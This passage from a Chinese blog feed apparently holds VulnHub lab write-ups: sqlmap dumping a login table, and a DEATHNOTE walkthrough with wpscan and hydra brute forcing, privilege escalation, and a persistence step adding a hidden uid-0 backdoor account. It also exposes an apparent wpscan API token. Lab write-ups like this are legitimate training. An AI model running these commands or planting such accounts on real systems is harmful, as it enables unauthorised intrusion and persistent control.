&lt;p&gt;-&amp;gt; role 解密后的数据最终显示为 admin, 修改存储在 cookie 中的值为 admin&lt;/p&gt;
&lt;p&gt;再次访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=&#34;&gt;http://192.168.31.98/enter_network/admin.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-380.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 于此，便得到了另外一半的 flag 的值&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-指定数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-指定数据包&#34;&gt;#&lt;/a&gt; sqlmap 指定数据包&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==&#34;&gt;http://192.168.31.98/enter_network&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-381.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个页面是可能产生 sql 注入的，通过 burp 抓取数据包，讲数据包保存到本地文件 sqlmap.txt 如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-382.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch --dbs&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-383.png&#34; width=&#34;280&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到有四个数据库名&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-测试数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap-测试数据库&#34;&gt;#&lt;/a&gt; sqlmap 测试数据库&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch -D Machine --tables&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-384.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Machine 数据库中有 login 的表&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch -D Machine -T login --columns&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-385.png&#34; width=&#34;190&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;login 表下有 username,password,role 三个列&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-386.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;三个列里边分别有下面三个字段，同时也拿到了 flag&lt;/p&gt;
&lt;p&gt;尝试反弹 shell，通过 os-shell 失败，没有可写入的文件，但是可以通过下面的命令直接调用出 sql 语句，进行查表&lt;br&gt;
 &lt;code&gt;sqlmap -r sqlmap.txt --sql-shell&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-386.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机结束&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/111%20DEATHNOTE/</id>
        <title>VULNHUB 11 DEATHNOTE</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/111%20DEATHNOTE/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGVhdGhub3RlLTEsNzM5Lw==&#34;&gt;https://www.vulnhub.com/entry/deathnote-1,739/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpb253ZXJzb24vYXJ0aWNsZS9kZXRhaWxzLzEyMTU5NDU0NQ==&#34;&gt;https://blog.csdn.net/lionwerson/article/details/121594545&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 DEATHNOTE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;获取靶机 ip 地址&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;去除一些已知ip的机器，对剩余IP进行端口扫描，判断目标IP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者使用 arp 扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo arp -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-229.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.212&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.212 -oN /tmp/deathnote.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-230.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80&lt;/p&gt;
&lt;h3 id=&#34;wpscan-扫描-wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-扫描-wordpress&#34;&gt;#&lt;/a&gt; wpscan 扫描 wordpress&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjEyLw==&#34;&gt;http://192.168.31.212/&lt;/span&gt; 进行信息收集&lt;br&gt;
网页发生跳转，可直接修改本地 hosts 文件，改变 dns 解析&lt;br&gt;
 /etc/hosts 中添加 192.168.31.212 deathnote.vuln&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-231.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;网站是一个 wordpress 网站，可直接利用 wpscan 扫描&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过wpscan对网站的用户名进行枚举&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.212/wordpress/ --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-232.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到网站的用户名有 kira&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据用户名kira继续扫描密码看是否能扫到&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.212/wordpress/ -U kira -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 没有扫到用户 kira 的密码&lt;/p&gt;
&lt;p&gt;翻阅网站可点击的地方，找到一处提示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-233.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;根据提示，访问 http://192.168.31.212/notes.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-234.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有找到这个提示文件&lt;/p&gt;
&lt;p&gt;顺便访问一下爬虫协议的文件：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjEyL3JvYm90cy50eHQ=&#34;&gt;http://192.168.31.212/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-235.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据提示下载 jpg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://192.168.31.212/important.jpg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat important.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-236.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;新的提示，网站密码应该在网站的页面上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-237.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 发现疑似密码的字符串 iamjustic3&lt;/p&gt;
&lt;h3 id=&#34;wordpress-后台突破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-后台突破&#34;&gt;#&lt;/a&gt; wordpress 后台突破&lt;/h3&gt;
&lt;p&gt;可以使用 msf 直接 getshell，或者在后台寻找突破反弹 shell&lt;br&gt;
wordpress 的后台 wp-login：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjEyL3dvcmRwcmVzcy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.212/wordpress/wp-login.php&lt;/span&gt;&lt;br&gt;
 用户名 kira 密码 iamjustic3&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-238.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;翻阅后台文件，找到了 notes.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-239.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击进入到 notes.txt 可以找到这个文件的 url 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-240.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;下载到本地，查看此文件查询更多详细的信息&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat notes.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-241.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 SSH&lt;/h3&gt;
&lt;p&gt;发现是一个密码文件，尝试用 hydra 进行爆破 ssh 登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -l kira - P notes.txt ssh://192.168.31. 212 - f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-242.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 爆破失败，无法用用户 kira 登陆到此服务器&lt;/p&gt;
&lt;p&gt;前面得到一个线索 user.txt 中可能藏着一些敏感的用户&lt;br&gt;
此时我们已经拿到了后台的权限，可以访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy9ub3Rlcy50eHQ=&#34;&gt; http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt&lt;/span&gt;&lt;br&gt;
 获取到目标机器密码的列表，我们可以尝试访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RlYXRobm90ZS52dWxuL3dvcmRwcmVzcy93cC1jb250ZW50L3VwbG9hZHMvMjAyMS8wNy91c2VyLnR4dA==&#34;&gt; http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-243.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到了敏感的 user.txt 文件，可以用做 hydra 的爆破用户名的字典，可以将疑似网站用户的昵称提前，如在网站上看到的 kira，l&lt;br&gt;
 如果用户名刚好是这些，可以很快的提高爆破速度&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P notes.txt ssh://192.168.31. 212 -f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-244.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名 l 密码 death4me&lt;/p&gt;
&lt;h3 id=&#34;cyberchef-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cyberchef-解密&#34;&gt;#&lt;/a&gt; CyberChef 解密&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登陆到目标服务器&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh l@192.168.31.212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集服务器的相关信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/issue &amp;amp;&amp;amp; uname -a &amp;amp;&amp;amp; sudo -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-245.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户 l 在目标机器上没有 sudo 权限&lt;/p&gt;
&lt;p&gt;翻阅目录，找到了下面这个加密文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-246.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这是 brainfuck 加密，在线解密 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr&#34;&gt;https://ctf.bugku.com/tool/brainfuck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-247.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到提示，我们需要进入到 kira 用户里边，再次在目标服务器里边进行搜索，找到一个敏感目录 /opt/L&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-248.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在线解密 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;https://gchq.github.io/CyberChef/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-249.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 通过 magic 方法可破解得到密码 kiraisevil&lt;/p&gt;
&lt;p&gt;&lt;code&gt;su kira&lt;/code&gt;  切换到 kira 账户，sudo -l 查看相关权限设置&lt;br&gt;
发现该账户可以执行所有的 root 命令，直接 sudo su 切换到 root 账户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-250.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;创建特权用户维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#创建特权用户维权&#34;&gt;#&lt;/a&gt; 创建特权用户维权&lt;/h3&gt;
&lt;p&gt;权限维持参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv&#34;&gt;https://bypass007.github.io/Emergency-Response-Notes/privilege/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个用户名X_T，密码 123456 的普通用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd -p `openssl passwd - 1 - salt &amp;#x27;salt&amp;#x27; 123456` X_T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个用户名kali，密码kali的root用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd -p `openssl passwd - 1 - salt &amp;#x27;salt&amp;#x27; kali` kali -o -u 0 -g root -G root -s /bin/bash -d /home/test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh X_T@192.168.31.212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su kali&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-251.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 每次都可以通过先登陆到 X_T 用户，再通过 su kali 切换到 root 账户&lt;/p&gt;
&lt;h3 id=&#34;可疑用户排查技巧&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可疑用户排查技巧&#34;&gt;#&lt;/a&gt; 可疑用户排查技巧&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查询特权用户特权用户(uid 为 0 )&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;awk -F: &amp;#x27;$3==0&amp;#123;print $1&amp;#125;&amp;#x27; /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span 